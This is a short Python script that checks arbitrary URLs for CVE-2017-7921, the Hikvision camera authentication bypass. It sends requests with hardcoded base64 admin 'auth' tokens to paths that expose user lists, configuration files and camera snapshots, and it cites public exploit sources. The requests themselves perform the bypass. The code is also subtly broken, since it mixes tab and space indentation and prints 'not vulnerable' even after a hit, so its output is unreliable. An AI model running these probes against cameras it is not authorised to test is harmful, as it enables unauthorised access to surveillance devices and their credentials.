import requests
from requests.exceptions import SSLError

def make_request(url, path):
	# Prepare the User-Agent header as in the original script
    user_agent = "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
    
    full_url = f"{url}{path}"

    try:
        response = requests.get(full_url, headers={"User-Agent": user_agent}, verify=False, timeout=5)

        if response.status_code == 200:
        	return True
        else:
        	return False
    except SSLError as e: # can't connect via https, probably not hikvision, or it is misconfigured
        return False
    except requests.exceptions.ConnectionError as e: # peer closed connection, not hikvision or it isn't available
        return False
    except Exception as e:
        print(f"An exception occured: {e}")
        exit(1)

def probe_keys(url):
	paths = [
		# Ref: https://github.com/K3ysTr0K3R/CVE-2017-7921-EXPLOIT/blob/main/CVE-2017-7921.sh
		"/System/time?auth=YWRtaW46UEtTOHVpTWg1UUk4",
		"/Security/users?auth=YWRtaW46c28xWVBx",
		"/System/deviceInfo?auth=YWRtaW46a3ZEUE4",
		"/Network/interfaces?auth=YWRtaW46OXduWA",
		"/System/Storage/volumes?auth=YWRtaW46b0tSb0ZGNzl6",
		# Ref: https://github.com/millersartin/Hikvision-Vulnerability-Scanner-POC/blob/main/main.py
		"/onvif-http/snapshot?auth=YWRtaW46MTEK",
		# Ref: https://www.exploit-db.com/exploits/45231
		"/System/configurationFile?auth=YWRtaW46MTEK"
	]

	for path in paths:
		if make_request(url, path):
			print(f"{url} is vulnerable to CVE-2017-7921 via {url}{path}")

	print(f"{url} is not vulnerable to CVE-2017-7921")



